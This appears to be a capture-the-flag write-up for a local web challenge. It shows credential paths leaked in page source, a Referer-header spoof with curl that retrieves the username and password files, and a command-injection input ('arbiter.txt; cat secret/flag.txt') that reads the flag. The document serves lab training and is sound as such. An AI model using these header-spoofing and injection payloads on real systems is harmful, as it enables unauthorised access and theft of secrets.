# Slowly Downward #
viewing page source of /SMALL_THOUGHTS.html reveals <div id="ADMIN">username@text/credentials/user.txt password@text/credentials/pass.txt</div>

going to http://127.0.0.1:5000/text/credentials/user.txt or http://127.0.0.1:5000/text/credentials/pass.txt returns
Forbidden
You don't have the permission to access the requested resource. URL root does not match /abit.html.

```
curl -v -H "Referer: http://127.0.0.1:5000/abit.html" http://127.0.0.1:5000/text/credentials/user.txt
*   Trying 127.0.0.1:5000...
* Connected to 127.0.0.1 (127.0.0.1) port 5000
> GET /text/credentials/user.txt HTTP/1.1
> Host: 127.0.0.1:5000
> User-Agent: curl/8.4.0
> Accept: */*
> Referer: http://127.0.0.1:5000/abit.html
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.2 Python/3.12.2
< Date: Mon, 08 Apr 2024 22:14:41 GMT
< Content-Disposition: inline; filename=user.txt
< Content-Type: text/plain; charset=utf-8
< Content-Length: 5
< Last-Modified: Mon, 08 Apr 2024 19:46:39 GMT
< Cache-Control: no-cache
< ETag: "1712605599.142378-5-408426695"
< Date: Mon, 08 Apr 2024 22:14:41 GMT
< Connection: close
<
4dm1n* Closing connection

curl -v -H "Referer: http://127.0.0.1:5000/abit.html" http://127.0.0.1:5000/text/credentials/pass.txt
*   Trying 127.0.0.1:5000...
* Connected to 127.0.0.1 (127.0.0.1) port 5000
> GET /text/credentials/pass.txt HTTP/1.1
> Host: 127.0.0.1:5000
> User-Agent: curl/8.4.0
> Accept: */*
> Referer: http://127.0.0.1:5000/abit.html
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.2 Python/3.12.2
< Date: Mon, 08 Apr 2024 22:14:58 GMT
< Content-Disposition: inline; filename=pass.txt
< Content-Type: text/plain; charset=utf-8
< Content-Length: 23
< Last-Modified: Mon, 08 Apr 2024 19:46:42 GMT
< Cache-Control: no-cache
< ETag: "1712605602.8808155-23-403380415"
< Date: Mon, 08 Apr 2024 22:14:58 GMT
< Connection: close
<
p4ssw0rd1sb0dy5n4tch3r5* Closing connection
```

going to /abit.html and entering credentials above gives access to view unpublished text files
```
arbiter.txt; cat secret/flag.txt
```
reveals flag